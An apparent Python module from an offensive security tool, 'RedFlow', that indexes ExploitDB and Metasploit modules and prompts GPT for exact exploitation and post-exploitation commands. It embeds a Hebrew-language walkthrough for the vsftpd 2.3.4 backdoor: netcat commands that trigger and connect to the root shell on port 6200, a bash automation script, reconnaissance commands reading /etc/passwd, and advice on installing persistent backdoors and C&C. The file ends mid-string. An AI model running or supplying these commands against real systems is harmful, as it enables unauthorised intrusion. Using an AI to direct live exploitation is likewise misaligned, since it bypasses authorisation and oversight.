#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
GPT Exploit Advisor for RedFlow
Advanced AI-powered exploit suggestion engine
"""

import os
import json
import re
import time
import logging
import glob
import subprocess
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass
from datetime import datetime, timedelta
from pathlib import Path
import sys
import markdown
from rich.console import Console
from rich.markdown import Markdown
from rich.panel import Panel
import yaml

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

# Import required RedFlow components
from redflow.utils.config import Config
from redflow.modules.gpt.openai_client import OpenAIClient

@dataclass
class ExploitInfo:
    """Dataclass to store exploit information"""
    title: str
    path: str
    file_ext: str
    cve: Optional[str] = None
    service: Optional[str] = None
    protocol: Optional[str] = None
    min_version: Optional[str] = None
    max_version: Optional[str] = None
    metasploit_path: Optional[str] = None
    description: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for JSON serialization"""
        return {
            "title": self.title,
            "path": self.path,
            "file_ext": self.file_ext,
            "cve": self.cve,
            "service": self.service,
            "protocol": self.protocol,
            "min_version": self.min_version,
            "max_version": self.max_version,
            "metasploit_path": self.metasploit_path,
            "description": self.description
        }
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'ExploitInfo':
        """Create ExploitInfo from dictionary"""
        return cls(
            title=data.get("title", ""),
            path=data.get("path", ""),
            file_ext=data.get("file_ext", ""),
            cve=data.get("cve"),
            service=data.get("service"),
            protocol=data.get("protocol"),
            min_version=data.get("min_version"),
            max_version=data.get("max_version"),
            metasploit_path=data.get("metasploit_path"),
            description=data.get("description")
        )


class ExploitAdvisor:
    """
    GPT-powered exploit advisor for RedFlow
    
    This class handles:
    1. Caching and indexing of local exploit databases
    2. Matching services and versions to appropriate exploits
    3. Using GPT to verify and explain exploits
    4. Generating Metasploit resource scripts
    """
    
    def __init__(self, config: Config, logger: logging.Logger, console=None):
        """
        Initialize GPT Exploit Advisor
        
        Args:
            config: RedFlow configuration
            logger: Logger instance
            console: Rich console instance (optional)
        """
        self.config = config
        self.logger = logger
        self.console = console or Console()
        
        # Initialize OpenAI client with API key
        api_key = config.get_gpt_api_key()
        
        if not api_key:
            self.logger.warning("OpenAI API key not found. Attempting to get key from user.")
            self.console.print("[bold yellow]OpenAI API key not found. GPT Exploit Advisor requires a valid API key.[/bold yellow]")
            
            # Ask the user for an API key
            self.console.print("\n[bold cyan]OpenAI API Key Setup[/bold cyan]")
            self.console.print("[yellow]An OpenAI API key is required for GPT-powered exploit analysis.[/yellow]")
            self.console.print("[yellow]You can get one from https://platform.openai.com/api-keys[/yellow]")
            api_key = self.console.input("[green]Enter your OpenAI API key: [/green]").strip()
            
            if api_key and len(api_key) > 10:
                # Ask if they want to save it
                save_key = self.console.input("[green]Save this API key for future use? (y/n): [/green]").lower()
                if save_key.startswith("y"):
                    key_file = os.path.expanduser('~/.openai_api_key')
                    with open(key_file, 'w') as f:
                        f.write(api_key)
                    self.console.print("[green]API key saved to ~/.openai_api_key[/green]")
                    
                    # Also try to update config.yaml if it exists
                    config_file = os.path.join(os.path.dirname(config.output_dir), "config.yaml")
                    if os.path.exists(config_file):
                        try:
                            with open(config_file, 'r', encoding='utf-8') as f:
                                config_data = yaml.safe_load(f)
                            
                            if config_data and 'gpt' in config_data:
                                config_data['gpt']['api_key'] = api_key
                                with open(config_file, 'w', encoding='utf-8') as f:
                                    yaml.dump(config_data, f, default_flow_style=False)
                                self.console.print("[green]API key also saved to config.yaml[/green]")
                        except Exception as e:
                            self.logger.warning(f"Could not update config.yaml: {e}")
                
                # Set the API key in the config and in environment
                config.set_gpt_api_key(api_key)
                os.environ["OPENAI_API_KEY"] = api_key
            else:
                self.logger.warning("Invalid API key provided. GPT Exploit Advisor will use mock responses.")
                self.console.print("[bold yellow]Invalid API key. GPT Exploit Advisor will use limited mock responses.[/bold yellow]")
                api_key = "mock_api_key"  # Use a placeholder so client initializes
        
        # Pass all GPT settings to OpenAI client
        self.openai_client = OpenAIClient(
            api_key=api_key,
            logger=logger,
            model=config.gpt_settings["model"],
            temperature=config.gpt_settings["temperature"],
            max_tokens=config.gpt_settings["max_tokens"],
            top_p=config.gpt_settings.get("top_p", 1.0),
            frequency_penalty=config.gpt_settings.get("frequency_penalty", 0.0),
            presence_penalty=config.gpt_settings.get("presence_penalty", 0.0)
        )
        
        # Check if the OpenAI client is available
        if not self.openai_client.available:
            self.logger.warning("GPT Exploit Advisor is not available - invalid or missing API key")
            self.console.print("[bold yellow]Note: GPT Exploit Advisor is not available - missing or invalid API key[/bold yellow]")

        # Initialize cache paths and directories
        self.cache_dir = os.path.join(config.output_dir, "cache")
        self.exploits_cache_file = os.path.join(self.cache_dir, "exploits_cache.json")
        
        # Create cache directory if it doesn't exist
        os.makedirs(self.cache_dir, exist_ok=True)
         
        # Set paths for exploitdb and metasploit
        if hasattr(config, 'exploitation'):
            self.exploit_db_path = config.exploitation.get("exploitdb_path", "/usr/share/exploitdb")
        else:
            self.exploit_db_path = "/usr/share/exploitdb"
            self.logger.warning("Exploitation configuration not found, using default paths")
        
        self.metasploit_path = "/usr/share/metasploit-framework/modules/exploits"
        
        # Initialize caches
        self.cached_exploits: List[ExploitInfo] = []
        self.gpt_responses: Dict[str, Any] = {}
        
        # Load or initialize the exploit cache
        self.load_or_build_cache()
    
    def load_or_build_cache(self) -> None:
        """Load cached exploits or build the cache if not available"""
        if os.path.exists(self.exploits_cache_file):
            cache_age = datetime.now() - datetime.fromtimestamp(os.path.getmtime(self.exploits_cache_file))
            
            # If cache is less than 7 days old, load it
            if cache_age < timedelta(days=7):
                self.logger.info("Loading exploit cache from file")
                try:
                    with open(self.exploits_cache_file, 'r') as f:
                        cache_data = json.load(f)
                        self.cached_exploits = [ExploitInfo.from_dict(item) for item in cache_data]
                    
                    self.logger.info(f"Loaded {len(self.cached_exploits)} exploits from cache")
                    return
                except Exception as e:
                    self.logger.warning(f"Failed to load exploit cache: {e}")
        
        # If we get here, we need to build the cache
        self.logger.info("Building exploit cache from local databases")
        self.console.print("[bold yellow]Building exploit database cache. This might take a moment...[/bold yellow]")
        
        # Clear existing cache
        self.cached_exploits = []
        
        # Index ExploitDB
        if os.path.exists(self.exploit_db_path):
            self._index_exploitdb()
        else:
            self.logger.warning(f"ExploitDB not found at {self.exploit_db_path}")
            self.console.print(f"[bold red]Warning:[/bold red] ExploitDB not found at {self.exploit_db_path}")
            
            # Check if searchsploit is installed
            try:
                # Try running searchsploit with -h to check if it's installed
                result = subprocess.run(["searchsploit", "-h"], capture_output=True, text=True)
                if result.returncode != 0:
                    self.console.print("[bold red]Error:[/bold red] searchsploit command not found")
                    self.console.print("[yellow]To install searchsploit on Kali Linux, run:[/yellow]")
                    self.console.print("    sudo apt update && sudo apt install exploitdb")
            except FileNotFoundError:
                self.console.print("[bold red]Error:[/bold red] searchsploit command not found")
                self.console.print("[yellow]To install searchsploit on Kali Linux, run:[/yellow]")
                self.console.print("    sudo apt update && sudo apt install exploitdb")
        
        # Index Metasploit modules
        if os.path.exists(self.metasploit_path):
            self._index_metasploit()
        else:
            self.logger.warning(f"Metasploit framework not found at {self.metasploit_path}")
            self.console.print(f"[bold red]Warning:[/bold red] Metasploit framework not found at {self.metasploit_path}")
            
            # Check if msfconsole is installed
            try:
                # Try running msfconsole with -h to check if it's installed
                result = subprocess.run(["msfconsole", "-h"], capture_output=True, text=True)
                if result.returncode != 0:
                    self.console.print("[bold red]Error:[/bold red] msfconsole command not found")
                    self.console.print("[yellow]To install Metasploit on Kali Linux, run:[/yellow]")
                    self.console.print("    sudo apt update && sudo apt install metasploit-framework")
            except FileNotFoundError:
                self.console.print("[bold red]Error:[/bold red] msfconsole command not found")
                self.console.print("[yellow]To install Metasploit on Kali Linux, run:[/yellow]")
                self.console.print("    sudo apt update && sudo apt install metasploit-framework")
                self.console.print("[yellow]After installation, restart your terminal and try again.[/yellow]")
        
        # Save the cache
        self._save_cache()
        
        self.logger.info(f"Built cache with {len(self.cached_exploits)} exploits")
        self.console.print(f"[bold green]Built exploit cache with {len(self.cached_exploits)} entries[/bold green]")
    
    def _save_cache(self) -> None:
        """Save the current exploit cache to disk"""
        try:
            cache_data = [exploit.to_dict() for exploit in self.cached_exploits]
            with open(self.exploits_cache_file, 'w') as f:
                json.dump(cache_data, f, indent=2)
            self.logger.info(f"Saved {len(self.cached_exploits)} exploits to cache")
        except Exception as e:
            self.logger.error(f"Failed to save exploit cache: {e}")
    
    def _index_exploitdb(self) -> None:
        """Index exploits from ExploitDB"""
        self.logger.info("Indexing ExploitDB exploits")
        
        # Get exploits from FileDiscloser.csv
        csv_path = os.path.join(self.exploit_db_path, "files_exploits.csv")
        if not os.path.exists(csv_path):
            self.logger.warning(f"ExploitDB CSV file not found at {csv_path}")
            return
        
        try:
            # Read the CSV file manually to avoid dependencies
            with open(csv_path, 'r', encoding='utf-8') as f:
                # Skip header
                header = f.readline().strip().split(',')
                
                # Process each line
                for line in f:
                    try:
                        # Split by comma, but respect quotes
                        parts = re.findall(r'(?:[^,"]|"(?:\\.|[^"])*")++', line)
                        parts = [p.strip().strip('"') for p in parts]
                        
                        if len(parts) < 5:
                            continue
                        
                        # Extract information
                        exploit_id = parts[0].strip()
                        file_path = parts[1].strip()
                        title = parts[2].strip()
                        
                        # Full path to the exploit
                        full_path = os.path.join(self.exploit_db_path, file_path)
                        if not os.path.exists(full_path):
                            continue
                        
                        # Extract extension
                        file_ext = os.path.splitext(file_path)[1].lower()
                        
                        # Extract CVE if present
                        cve = None
                        cve_match = re.search(r'CVE-\d{4}-\d{4,}', title, re.IGNORECASE)
                        if cve_match:
                            cve = cve_match.group(0)
                        
                        # Extract service and version information
                        service, min_version, max_version = self._extract_service_info(title)
                        
                        # Create and add exploit info
                        exploit_info = ExploitInfo(
                            title=title,
                            path=full_path,
                            file_ext=file_ext,
                            cve=cve,
                            service=service,
                            min_version=min_version,
                            max_version=max_version
                        )
                        
                        self.cached_exploits.append(exploit_info)
                    except Exception as e:
                        self.logger.debug(f"Error processing exploit line: {e}")
                        continue
        
        except Exception as e:
            self.logger.error(f"Error indexing ExploitDB: {e}")
        
        self.logger.info(f"Indexed {len(self.cached_exploits)} exploits from ExploitDB")
    
    def _index_metasploit(self) -> None:
        """Index exploits from Metasploit Framework"""
        self.logger.info("Indexing Metasploit modules")
        
        # Get all .rb files recursively
        pattern = os.path.join(self.metasploit_path, "**", "*.rb")
        module_files = glob.glob(pattern, recursive=True)
        
        metasploit_count = 0
        
        for file_path in module_files:
            try:
                # Extract module path (relative to exploits directory)
                rel_path = os.path.relpath(file_path, self.metasploit_path)
                module_path = os.path.splitext(rel_path)[0]  # Remove .rb extension
                
                # Read file content to extract information
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                # Extract name/title
                title_match = re.search(r"['\"]Name['\"].*?['\"](.+?)['\"]", content, re.DOTALL)
                title = title_match.group(1) if title_match else os.path.basename(file_path)
                
                # Extract description
                desc_match = re.search(r"['\"]Description['\"].*?['\"](.+?)['\"]", content, re.DOTALL)
                description = desc_match.group(1) if desc_match else None
                
                # Extract CVE if present
                cve = None
                cve_match = re.search(r'CVE-\d{4}-\d{4,}', content, re.IGNORECASE)
                if cve_match:
                    cve = cve_match.group(0)
                
                # Extract service and version information
                service, min_version, max_version = self._extract_service_info(title)
                
                # Determine protocol from the module path
                protocol = None
                if "/ftp/" in file_path:
                    protocol = "ftp"
                elif "/ssh/" in file_path:
                    protocol = "ssh"
                elif "/http/" in file_path:
                    protocol = "http"
                elif "/smb/" in file_path:
                    protocol = "smb"
                
                # Create metasploit module path
                metasploit_module_path = f"exploit/{module_path}"
                
                # Create and add exploit info
                exploit_info = ExploitInfo(
                    title=title,
                    path=file_path,
                    file_ext=".rb",
                    cve=cve,
                    service=service,
                    protocol=protocol,
                    min_version=min_version,
                    max_version=max_version,
                    metasploit_path=metasploit_module_path,
                    description=description
                )
                
                self.cached_exploits.append(exploit_info)
                metasploit_count += 1
            
            except Exception as e:
                self.logger.debug(f"Error processing Metasploit module {file_path}: {e}")
                continue
        
        self.logger.info(f"Indexed {metasploit_count} modules from Metasploit")
    
    def _extract_service_info(self, title: str) -> Tuple[Optional[str], Optional[str], Optional[str]]:
        """
        Extract service name and version information from exploit title
        
        Args:
            title: Exploit title
            
        Returns:
            Tuple of (service, min_version, max_version)
        """
        # Common services to look for
        common_services = [
            "apache", "nginx", "iis", "vsftpd", "proftpd", "openssh", "wordpress",
            "tomcat", "jboss", "weblogic", "drupal", "joomla", "mysql", "postgresql",
            "oracle", "samba", "smb", "windows", "linux", "unix", "macos", "docker",
            "kubernetes", "jenkins", "gitlab", "php", "python", "perl", "ruby", "java"
        ]
        
        service = None
        min_version = None
        max_version = None
        
        # Try to match service name
        for s in common_services:
            if re.search(r'\b' + re.escape(s) + r'\b', title.lower()):
                service = s
                break
        
        # Extract version ranges using various patterns
        
        # Pattern: Apache 2.4.0 - 2.4.49
        range_match = re.search(r'(\d+\.\d+(?:\.\d+)?)\s*[-_~]\s*(\d+\.\d+(?:\.\d+)?)', title)
        if range_match:
            min_version = range_match.group(1)
            max_version = range_match.group(2)
            return service, min_version, max_version
        
        # Pattern: Apache <= 2.4.49
        lte_match = re.search(r'<=\s*(\d+\.\d+(?:\.\d+)?)', title)
        if lte_match:
            max_version = lte_match.group(1)
            return service, min_version, max_version
        
        # Pattern: Apache < 2.4.50
        lt_match = re.search(r'<\s*(\d+\.\d+(?:\.\d+)?)', title)
        if lt_match:
            # For "Apache < 2.4.50", max version would be 2.4.49
            version_parts = lt_match.group(1).split('.')
            if len(version_parts) >= 3:
                patch = int(version_parts[2]) - 1
                if patch >= 0:
                    max_version = f"{version_parts[0]}.{version_parts[1]}.{patch}"
            else:
                max_version = lt_match.group(1)
            return service, min_version, max_version
        
        # Pattern: Apache >= 2.4.0
        gte_match = re.search(r'>=\s*(\d+\.\d+(?:\.\d+)?)', title)
        if gte_match:
            min_version = gte_match.group(1)
            return service, min_version, max_version
        
        # Pattern: Apache > 2.3.9
        gt_match = re.search(r'>\s*(\d+\.\d+(?:\.\d+)?)', title)
        if gt_match:
            # For "Apache > 2.3.9", min version would be 2.4.0 (increment minor)
            version_parts = gt_match.group(1).split('.')
            if len(version_parts) >= 2:
                minor = int(version_parts[1]) + 1
                min_version = f"{version_parts[0]}.{minor}.0"
            else:
                min_version = gt_match.group(1)
            return service, min_version, max_version
        
        # Pattern: Apache 2.4.49
        version_match = re.search(r'\b(\d+\.\d+(?:\.\d+)?)\b', title)
        if version_match:
            exact_version = version_match.group(1)
            # Assuming this is the exact version affected
            min_version = exact_version
            max_version = exact_version
            return service, min_version, max_version
        
        return service, min_version, max_version
    
    def _compare_versions(self, version1: str, version2: str) -> int:
        """
        Compare two version strings
        
        Args:
            version1: First version string
            version2: Second version string
            
        Returns:
            -1 if version1 < version2, 0 if version1 == version2, 1 if version1 > version2
        """
        try:
            v1_parts = list(map(int, version1.split('.')))
            v2_parts = list(map(int, version2.split('.')))
            
            # Pad with zeros if needed
            while len(v1_parts) < len(v2_parts):
                v1_parts.append(0)
            while len(v2_parts) < len(v1_parts):
                v2_parts.append(0)
            
            for i in range(len(v1_parts)):
                if v1_parts[i] < v2_parts[i]:
                    return -1
                elif v1_parts[i] > v2_parts[i]:
                    return 1
            
            return 0
        except Exception:
            # If we can't parse the versions, just do string comparison
            if version1 < version2:
                return -1
            elif version1 > version2:
                return 1
            else:
                return 0
    
    def _is_version_in_range(self, version: str, min_version: Optional[str], max_version: Optional[str]) -> bool:
        """
        Check if a version is within a specified range
        
        Args:
            version: Version to check
            min_version: Minimum version (inclusive) or None
            max_version: Maximum version (inclusive) or None
            
        Returns:
            True if version is in range, False otherwise
        """
        if not version:
            return False
        
        # If no range specified, assume match
        if not min_version and not max_version:
            return True
        
        # Check minimum version
        if min_version and self._compare_versions(version, min_version) < 0:
            return False
        
        # Check maximum version
        if max_version and self._compare_versions(version, max_version) > 0:
            return False
        
        return True
    
    def find_exploits_for_service(self, service_name: str, version: str = "") -> List[ExploitInfo]:
        """
        Find exploits for a specific service
        
        Args:
            service_name: Name of the service
            version: Optional version of the service
            
        Returns:
            List of ExploitInfo objects with matching exploits
        """
        self.logger.info(f"Searching for exploits for {service_name} {version}")
        
        # Special case for vsftpd 2.3.4 - known backdoor vulnerability
        if (service_name.lower() == "vsftpd" and version == "2.3.4") or \
           (service_name.lower() == "ftp" and "vsftpd 2.3.4" in version):
            # First, search specifically for vsftpd 2.3.4 backdoor
            backdoor_results = []
            for exploit in self.cached_exploits:
                if exploit.title and "vsftpd 2.3.4" in exploit.title.lower() and "backdoor" in exploit.title.lower():
                    self.logger.info(f"Found vsftpd 2.3.4 backdoor exploit: {exploit.title}")
                    backdoor_results.append(exploit)
            
            # If we found the specific backdoor exploit, prioritize it but still include other results
            if backdoor_results:
                # Get additional results but limit their number
                other_results = self._search_exploits("vsftpd")
                # Filter out duplicates
                for exploit in other_results:
                    if not any(r.path == exploit.path for r in backdoor_results):
                        backdoor_results.append(exploit)
                return backdoor_results[:20]
        
        # Check if we have a specific service name mapping
        # Often nmap reports generic 'ftp' when it's actually 'vsftpd', etc.
        service_mappings = {
            "ftp": ["vsftpd", "ftpd", "proftpd", "pure-ftpd"],
            "http": ["apache", "nginx", "httpd", "iis"],
            "ssh": ["openssh", "libssh"],
            "smtp": ["postfix", "sendmail", "exim"],
            "mysql": ["mariadb", "mysql-server"],
            "netbios-ssn": ["samba", "smbd"],
            "microsoft-ds": ["samba", "smbd"],
        }
        
        # List to hold the results
        results = []
        
        # First try exact search with the service name and version
        query = f"{service_name} {version}" if version else service_name
        results = self._search_exploits(query)
        
        # If we have a generic service name and no or few results, try with more specific service names
        if service_name.lower() in service_mappings and len(results) < 3:
            for specific_service in service_mappings[service_name.lower()]:
                # Search with the specific service name and version
                specific_query = f"{specific_service} {version}" if version else specific_service
                specific_results = self._search_exploits(specific_query)
                
                # Add new exploits to results
                for exploit in specific_results:
                    # Check if we already have this exploit in the results
                    if not any(e.path == exploit.path for e in results):
                        results.append(exploit)
                
                # If we have enough results, stop searching
                if len(results) >= 10:
                    break
        
        return results[:20]  # Limit to 20 results
    
    def generate_gpt_prompt(self, exploit: ExploitInfo, service_name: str, version: str) -> str:
        """
        Generate a prompt for GPT to analyze an exploit
        
        Args:
            exploit: ExploitInfo object
            service_name: Service name
            version: Service version
            
        Returns:
            Prompt string for GPT
        """
        prompt = """
You are a penetration testing expert with over 20 years of experience. You are also highly skilled with Kali Linux tools and exploitation techniques.
Your expertise includes all standard offensive security tools, exploits, and methodologies.

I have a specific target and need your guidance on the most effective exploitation approach using Kali Linux tools.

"""
        
        prompt += f"Target Info: {service_name} {version} running on a server.\n"
        prompt += "Found exploit:\n"
        prompt += f"- Title: {exploit.title}\n"
        prompt += f"- Path: {exploit.path}\n"
        
        if exploit.cve:
            prompt += f"- CVE: {exploit.cve}\n"
        
        prompt += f"- File type: {exploit.file_ext}\n"
        
        if exploit.metasploit_path:
            prompt += f"- Metasploit path: {exploit.metasploit_path}\n"
        
        prompt += f"\nDoes this exploit apply to {service_name} {version}? Please analyze if this exploit is suitable for this target.\n"
        prompt += "If yes, provide EXACT Kali Linux commands to execute the exploit step by step. Be specific and practical.\n"
        
        # Add hints based on file extension
        if exploit.file_ext == ".py":
            prompt += "\nIf it's a Python script, include the exact command to run it, including any options and arguments. Explain common issues and how to resolve them.\n"
            prompt += "Example: python3 /path/to/exploit.py -t TARGET_IP -p PORT\n"
        elif exploit.file_ext == ".rb" and exploit.metasploit_path:
            prompt += "\nFor Metasploit module, provide the complete msfconsole command sequence including all required options.\n"
            prompt += "Example: msfconsole -q -x \"use exploit/path; set RHOSTS target_ip; set RPORT port; exploit\"\n"
        elif exploit.file_ext == ".c":
            prompt += "\nFor C source code, include compilation instructions and execution commands.\n"
            prompt += "Example: gcc -o exploit exploit.c && ./exploit target_ip port\n"
        elif exploit.file_ext == ".sh":
            prompt += "\nFor shell scripts, include chmod and execution instructions.\n"
            prompt += "Example: chmod +x script.sh && ./script.sh target_ip port\n"
        
        # Special handling for common exploits
        if "vsftpd 2.3.4" in exploit.title.lower():
            prompt += """
For vsftpd 2.3.4 backdoor specifically:
1. Provide both Python exploit instructions and manual exploitation steps
2. Include how to check if the backdoor was successfully opened (port 6200)
3. Include troubleshooting steps if the backdoor fails to open
4. Provide the exact netcat command to connect to the backdoor
"""

        # Add request for post-exploitation instructions
        prompt += """
Also include:
1. How to verify if the exploit was successful
2. Post-exploitation steps to gather information
3. Common troubleshooting issues and solutions
4. Alternative approaches if this exploit fails

Format your response in clear sections with proper Markdown:
1. Vulnerability Assessment (including applicability to this target)
2. Execution Instructions (with exact commands)
3. Expected Outcome
4. Post-Exploitation
"""
        
        return prompt
    
    def analyze_exploit_with_gpt(self, exploit: ExploitInfo, service_name: str, version: str) -> Optional[str]:
        """
        Send exploit information to GPT for analysis
        
        Args:
            exploit: ExploitInfo object
            service_name: Service name
            version: Service version
            
        Returns:
            GPT's response or None if API key not provided or error occurs
        """
        # Check if GPT API key is available and valid
        api_key = self.config.get_gpt_api_key()
        if not api_key or api_key == "mock_api_key" or len(api_key) < 20:
            self.logger.warning("Valid GPT API key not found or too short. Asking user for key.")
            
            # Ask the user for an API key
            self.console.print("\n[bold yellow]GPT API key not found or invalid.[/bold yellow]")
            self.console.print("[bold cyan]OpenAI API Key Required[/bold cyan]")
            self.console.print("[yellow]An OpenAI API key is required for GPT-powered exploit analysis.[/yellow]")
            self.console.print("[yellow]You can get one from https://platform.openai.com/api-keys[/yellow]")
            api_key = self.console.input("[green]Enter your OpenAI API key: [/green]").strip()
            
            if api_key and len(api_key) > 20:
                # Ask if they want to save it
                save_key = self.console.input("[green]Save this API key for future use? (y/n): [/green]").lower()
                if save_key.startswith("y"):
                    key_file = os.path.expanduser('~/.openai_api_key')
                    with open(key_file, 'w') as f:
                        f.write(api_key)
                    self.console.print("[green]API key saved to ~/.openai_api_key[/green]")
                    
                    # Also try to update config.yaml if it exists
                    config_file = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), "config.yaml")
                    if os.path.exists(config_file):
                        try:
                            with open(config_file, 'r', encoding='utf-8') as f:
                                config_data = yaml.safe_load(f) or {}
                            
                            if 'gpt' not in config_data:
                                config_data['gpt'] = {}
                            
                            config_data['gpt']['api_key'] = api_key
                            
                            with open(config_file, 'w', encoding='utf-8') as f:
                                yaml.dump(config_data, f, default_flow_style=False)
                                
                            self.console.print("[green]API key also saved to config.yaml[/green]")
                        except Exception as e:
                            self.logger.warning(f"Could not update config.yaml: {e}")
                
                # Set the API key in the config and environment
                self.config.set_gpt_api_key(api_key)
                os.environ["OPENAI_API_KEY"] = api_key
                
                # Update OpenAI client with new key
                self.openai_client.api_key = api_key
                self.openai_client.available = True
            else:
                self.logger.warning("Invalid API key provided or too short. Using mock responses.")
                self.console.print("[bold yellow]Invalid API key. Using detailed mock responses instead.[/bold yellow]")
                
                # Special case for vsftpd 2.3.4
                if "vsftpd" in service_name.lower() and "2.3.4" in version:
                    self.logger.info("Providing detailed vsftpd 2.3.4 mock response")
                    return self._get_vsftpd_234_mock_response(exploit, service_name, version)
                return self._generate_mock_response(exploit, service_name, version)
        
        # Generate cache key for this query
        cache_key = f"{service_name}_{version}_{exploit.path}"
        
        # Check if response is already cached
        if cache_key in self.gpt_responses:
            self.logger.info(f"Using cached GPT response for {cache_key}")
            return self.gpt_responses[cache_key]
        
        # Generate prompt
        prompt = self.generate_gpt_prompt(exploit, service_name, version)
        
        try:
            self.logger.info(f"Sending request to GPT API for analysis of {exploit.title}")
            self.console.print(f"[bold cyan]Requesting GPT analysis for {exploit.title}...[/bold cyan]")
            
            # Send the prompt to OpenAI client
            response = self.openai_client.get_completion(prompt, service_name)
            
            if not response:
                self.logger.warning("No response from GPT API")
                self.console.print("[bold yellow]Note: No response from GPT API[/bold yellow]")
                
                # Special case for vsftpd 2.3.4
                if "vsftpd" in service_name.lower() and "2.3.4" in version:
                    self.logger.info("Providing detailed vsftpd 2.3.4 mock response instead")
                    return self._get_vsftpd_234_mock_response(exploit, service_name, version)
                return self._generate_mock_response(exploit, service_name, version)
            
            # Cache the response
            self.gpt_responses[cache_key] = response
            
            self.logger.info(f"Received GPT analysis for {exploit.title}")
            return response
            
        except Exception as e:
            self.logger.error(f"Error in GPT API request: {e}")
            self.console.print(f"[bold red]Error in GPT API request: {e}[/bold red]")
            
            # Special case for vsftpd 2.3.4
            if "vsftpd" in service_name.lower() and "2.3.4" in version:
                self.logger.info("Providing detailed vsftpd 2.3.4 mock response after error")
                return self._get_vsftpd_234_mock_response(exploit, service_name, version)
            return self._generate_mock_response(exploit, service_name, version)
    
    def _get_vsftpd_234_mock_response(self, exploit: ExploitInfo, service_name: str, version: str) -> str:
        """
        Generate a detailed response for vsftpd 2.3.4 backdoor
        
        Args:
            exploit: ExploitInfo object
            service_name: Service name
            version: Service version
            
        Returns:
            Vsftpd 2.3.4 specific text
        """
        return f"""
# ניתוח פגיעות: vsftpd 2.3.4 Backdoor

## מטרה
- **שירות**: vsftpd 2.3.4
- **Exploit**: {exploit.title}
- **CVE**: CVE-2011-2523

## ניתוח
vsftpd 2.3.4 מכיל backdoor ידוע שהוכנס לקוד המקור. כאשר נשלח שם משתמש המכיל את התווים `:)`, הbackdoor פותח shell בפורט 6200.

זה אחד הexploits הידועים והחזקים בעולם הפנטסט, והוא פשוט מאוד להפעלה. שיטת ניצול זו תעבוד רק על הגרסה המדויקת הזו (2.3.4).

# הוראות הפעלה מדויקות

## שיטה 1: שימוש בMetasploit (הדרך הקלה ביותר)
```bash
# הפעלת Metasploit עם הפקודות הנדרשות
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS TARGET_IP; set RPORT PORT; exploit"
```

## שיטה 2: ניצול ידני עם Netcat
```bash
# שלב 1: שליחת שם משתמש מיוחד עם סמיילי להפעלת הbackdoor
(echo "USER backdoor:)"; sleep 2; echo "PASS any"; sleep 5) | nc TARGET_IP PORT

# שלב 2: התחברות לshell שנפתח בפורט 6200
nc -v TARGET_IP 6200
```

## שיטה 3: שימוש בסקריפט Python (אם זמין)
```bash
# הורדת הסקריפט
searchsploit -m {os.path.basename(exploit.path)}

# הגדרת הרשאות הרצה
chmod +x {os.path.basename(exploit.path)}

# הרצת הסקריפט
python3 {os.path.basename(exploit.path)} TARGET_IP
```

## סקריפט Bash אוטומטי לניצול
```bash
#!/bin/bash
echo "Attempting to exploit vsftpd 2.3.4 backdoor..."
echo "Sending malicious username with smiley face to trigger backdoor"
(echo "USER backdoor:)"; sleep 2; echo "PASS any"; sleep 5) | nc TARGET_IP PORT

echo "Waiting for backdoor to open on port 6200..."
sleep 3
echo "Connecting to backdoor..."
nc -v TARGET_IP 6200
```

# בדיקת הצלחה ופתרון בעיות

## בדיקת הצלחה
לאחר התחברות לפורט 6200, הרץ את הפקודות הבאות כדי לוודא שיש לך shell:
```bash
id
whoami
ls -la
```

## פתרון בעיות
אם הexploit נכשל:

1. **בדוק שהמטרה באמת פגיעה**:
   ```bash
   nmap -sV -p PORT TARGET_IP | grep "vsftpd 2.3.4"
   ```

2. **בדוק אם פורט 6200 נפתח**:
   ```bash
   nmap -p 6200 TARGET_IP
   ```

3. **נסה עם תזמון שונה** - לפעמים יש צורך בהשהיות ארוכות יותר:
   ```bash
   (echo "USER backdoor:)"; sleep 3; echo "PASS any"; sleep 7) | nc TARGET_IP PORT
   ```

4. **בדוק שאין חסימת firewall** לפורט 6200 בין המחשב שלך למטרה.

5. **אם הכל נכשל**, נסה להשתמש בMetasploit שמטפל בהרבה מהבעיות אוטומטית.

# צעדים לאחר ניצול מוצלח

## איסוף מידע
```bash
uname -a           # מידע על מערכת ההפעלה
id                 # זהות המשתמש וקבוצות
ifconfig -a        # קונפיגורציית רשת
netstat -tunlp     # פורטים פתוחים
cat /etc/passwd    # רשימת משתמשים
find / -perm -4000 -type f 2>/dev/null  # קבצים עם SUID bit
```

## הסלמת הרשאות
בדוק הרשאות sudo, קבצים עם SUID, או פגיעויות kernel לקבלת הרשאות root אם אין לך כבר.

## יצירת התבססות קבועה
שקול ליצור משתמש קבוע, להתקין backdoor, או להעלות מנגנון C&C לשליטה עתידית במערכת.
"""

    def _generate_mock_response(self, exploit: ExploitInfo, service_name: str, version: str) -> str:
        """
        Generate a simple mock response when GPT API is not available
        
        Args:
            exploit: ExploitInfo object
            service_name: Service name
            version: Service version
            
        Returns:
            Mock response text
        """
        # Special case for vsftpd 2.3.4
        if "vsftpd" in service_name.lower() and "2.3.4" in version:
            return self._get_vsftpd_234_mock_response(exploit, service_name, version)
            
        # Handle Python exploits
        if exploit.file_ext.lower() == ".py":
            return f"""
# ניתוח פגיעות

## מטרה
- **שירות**: {service_name} {version}
- **Exploit**: {exploit.title}

## ניתוח
מערכת {service_name} בגרסה {version} עשויה להיות פגיעה לexploit זה. הניתוח בסיסי בלבד כיוון שלא חובר ל-GPT.

# הוראות הפעלה מדויקות

## הכנה
```bash
# יצירת תיקייה להורדת ה-exploit
mkdir -p ~/exploits
cd ~/exploits

# הורדת ה-exploit מ-searchsploit
searchsploit -m {os.path.basename(exploit.path)}

# הגדרת הרשאות הרצה
chmod +x {os.path.basename(exploit.path)}
```

## הרצה
```bash
# הרצה עם Python 3
python3 {os.path.basename(exploit.path)} TARGET_IP

# אם הפקודה הקודמת לא פעלה, יש לנסות עם פרמטרים שונים:
python3 {os.path.basename(exploit.path)} -t TARGET_IP -p PORT
# או
python3 {os.path.basename(exploit.path)} --target TARGET_IP --port PORT
```

